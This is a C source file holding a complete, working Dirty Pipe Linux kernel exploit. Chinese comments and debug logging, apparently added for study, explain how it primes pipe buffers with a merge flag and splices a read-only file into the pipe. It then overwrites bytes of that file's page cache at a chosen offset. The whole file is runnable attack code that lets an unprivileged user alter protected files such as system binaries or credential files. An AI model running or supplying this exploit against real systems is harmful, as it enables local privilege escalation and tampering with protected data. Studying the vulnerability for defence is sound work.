#define _GNU_SOURCE  // 启用GNU扩展功能
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/user.h>

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096  // 定义系统页大小
#endif

/**
 * 创建一个特殊管道，所有 pipe_inode_info 环中的缓冲区都设置 PIPE_BUF_FLAG_CAN_MERGE 标志
 * @param p 包含两个文件描述符的数组（管道两端）
 */
static void prepare_pipe(int p[2])
{
    fprintf(stderr, "[DEBUG] 开始初始化管道...\n");
    
    if (pipe(p)) {//创建一个特殊管道
        perror("[ERROR] 创建管道失败");
        abort();
    }

    // 获取管道缓冲区大小
    const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);
    fprintf(stderr, "[DEBUG] 管道缓冲区大小: %u 字节\n", pipe_size);
    // 通过获取pipe的max_usage字段数量乘以PAGE_SIZE
	// case F_GETPIPE_SZ:
	// 	ret = pipe->max_usage * PAGE_SIZE;
	// 	break;

    // ​在 x86 架构的 Linux 系统中，默认的内存页大小（PAGE_SIZE）为 4KB，即 4096 字节。​这是因为在 x86 架构下，PAGE_SHIFT 被定义为 12，因此 PAGE_SIZE 计算为 1 << 12，即 4096 字节。 ​

    static char buffer[4096];  // 用于填充管道的临时缓冲区

    fprintf(stderr, "[DEBUG] 阶段1/2 - 填充管道...\n");
    // 完全填满管道，使每个pipe_buffer获得PIPE_BUF_FLAG_CAN_MERGE标志
    // 通过循环写入数据，确保所有管道缓冲区都被标记为"可合并"状态
    for (unsigned r = pipe_size; r > 0;) {  // r初始化为管道总大小，循环直到填满所有空间，一个page的大小是4096，正好把每一个页都写满了！
        // 计算本次要写入的字节数：
        // 如果剩余需要填充的字节数(r)大于缓冲区大小(sizeof(buffer))，
        // 则本次写入sizeof(buffer)字节，否则写入剩余的全部字节(r)
        unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
        
        // 向管道写端(p[1])写入n字节数据(内容来自buffer)
        // write返回实际写入的字节数(written)
        ssize_t written = write(p[1], buffer, n);//这里操作的是管道所以他调用的函数其实是pipe_write，整个linux设计的时候就将所有东西都设置为了文件，对不同文件调用read和write的时候都有不同的函数来进行操作
        
        // 打印调试信息：显示尝试写入和实际写入的字节数
        fprintf(stderr, "[DEBUG] 写入 %u 字节到管道（实际写入: %zd）\n", n, written);
        
        // 更新剩余需要填充的字节数
        r -= written;
    }
    //向管道写入数据就会默认初始化PIPE_BUF_FLAG_CAN_MERGE标志位，如果有数据可写的话

    fprintf(stderr, "[DEBUG] 阶段2/2 - 排空管道...\n");
    // 排空管道（保留未初始化的flags字段）
    for (unsigned r = pipe_size; r > 0;) {
        unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
        ssize_t readed = read(p[0], buffer, n);
        fprintf(stderr, "[DEBUG] 从管道读取 %u 字节（实际读取: %zd）\n", n, readed);
        r -= readed;
    }

    fprintf(stderr, "[DEBUG] 管道准备完成，所有缓冲区标记为可合并\n");
}

int main(int argc, char **argv)
{
    fprintf(stderr, "[INFO] 程序启动，参数数量: %d\n", argc);
    
    // 参数验证
    if (argc != 4) {
        fprintf(stderr, "[ERROR] 用法: %s 目标文件 偏移量 数据\n", argv[0]);
        return EXIT_FAILURE;
    }

    /* 解析命令行参数 */
    const char *const path = argv[1];
    loff_t offset = strtoul(argv[2], NULL, 0);  // 字符串转长整型
    const char *const data = argv[3];  //手动输入，要进行覆盖的内容
    const size_t data_size = strlen(data);//计算出要覆盖的长度
    
    fprintf(stderr, "[DEBUG] 参数解析:\n");
    fprintf(stderr, "  目标文件: %s\n", path);
    fprintf(stderr, "  偏移量: 0x%llx (%lld)\n", (long long)offset, (long long)offset);
    fprintf(stderr, "  数据: '%s' (长度: %zu)\n", data, data_size);

    /* 检查页边界对齐 */
    fprintf(stderr, "[DEBUG] 检查页边界对齐...\n");
    //该步骤存疑，页边界对齐校验：确保偏移量不在页边界（offset % 4096 != 0），且数据不跨页。这是为了避免操作涉及多个内存页，简化利用过程。
    if (offset % PAGE_SIZE == 0) {
        fprintf(stderr, "[ERROR] 偏移量不能位于页边界 (0x%llx)\n", (long long)offset);
        return EXIT_FAILURE;
    }

    // 计算下一页边界和结束偏移量，从这片数据的这一页到下一个页的距离：next_page
    const loff_t next_page = (offset | (PAGE_SIZE - 1)) + 1;
    const loff_t end_offset = offset + (loff_t)data_size;
    fprintf(stderr, "[DEBUG] 下一页边界: 0x%llx\n", (long long)next_page);
    fprintf(stderr, "[DEBUG] 数据结束偏移: 0x%llx\n", (long long)end_offset);

    if (end_offset > next_page) {
        fprintf(stderr, "[ERROR] 数据跨越页边界 (当前页结束于 0x%llx)\n", (long long)next_page);
        return EXIT_FAILURE;
    }

    /* 打开目标文件并验证偏移量 */
    fprintf(stderr, "[DEBUG] 尝试以只读模式打开文件: %s\n", path);
    const int fd = open(path, O_RDONLY);
    if (fd < 0) {
        perror("[ERROR] 文件打开失败");
        return EXIT_FAILURE;
    }
    fprintf(stderr, "[INFO] 文件打开成功，文件描述符: %d\n", fd);

    // 获取文件状态信息
    struct stat st;
    if (fstat(fd, &st)) {
        perror("[ERROR] 获取文件状态失败");
        return EXIT_FAILURE;
    }
    fprintf(stderr, "[DEBUG] 文件大小: %lld 字节\n", (long long)st.st_size);

    if (offset > st.st_size) {
        fprintf(stderr, "[ERROR] 偏移量超出文件大小 (offset=%lld > size=%lld)\n", 
                (long long)offset, (long long)st.st_size);
        return EXIT_FAILURE;
    }

    if (end_offset > st.st_size) {
        fprintf(stderr, "[ERROR] 数据写入将导致文件扩展 (end_offset=%lld > size=%lld)\n",
                (long long)end_offset, (long long)st.st_size);
        return EXIT_FAILURE;
    }

    /* 创建带有可合并标志的管道 */
    int p[2];
    fprintf(stderr, "[INFO] 准备特殊管道...\n");
    prepare_pipe(p);
    fprintf(stderr, "[INFO] 管道文件描述符: 读端=%d, 写端=%d\n", p[0], p[1]);

    /* 使用splice将目标文件的一个字节转移到管道 */
    offset--;  // 调整到目标位置的前一个字节
    fprintf(stderr, "[DEBUG] 调整后的splice偏移量: 0x%llx\n", (long long)offset);
    
    fprintf(stderr, "[INFO] 执行splice操作...\n");
    ssize_t nbytes = splice(fd, &offset, p[1], NULL, 1, 0);//这里的作用是通过offset寻找到已经被打开文件的页缓存列表中的一个缓存页来替换pipe 中的缓存页
    if (nbytes < 0) {
        perror("[ERROR] splice操作失败");
        return EXIT_FAILURE;
    }
    fprintf(stderr, "[DEBUG] splice成功传输 %zd 字节\n", nbytes);
    
    if (nbytes == 0) {
        fprintf(stderr, "[ERROR] splice未传输任何数据\n");
        return EXIT_FAILURE;
    }

    /* 通过管道写入数据（利用未初始化的标志位） */
    fprintf(stderr, "[INFO] 尝试通过管道写入数据...\n");
    fprintf(stderr, "[DEBUG] 预期写入数据: %s (长度: %zu)\n", data, data_size);
    nbytes = write(p[1], data, data_size);
    if (nbytes < 0) {
        perror("[ERROR] 管道写入失败");
        return EXIT_FAILURE;
    }
    fprintf(stderr, "[DEBUG] 实际写入字节数: %zd\n", nbytes);
    
    if ((size_t)nbytes < data_size) {
        fprintf(stderr, "[ERROR] 部分写入 (预期: %zu, 实际: %zd)\n", data_size, nbytes);
        return EXIT_FAILURE;
    }

    fprintf(stderr, "[SUCCESS] 操作成功完成！\n");
    printf("It worked!\n");
    return EXIT_SUCCESS;
}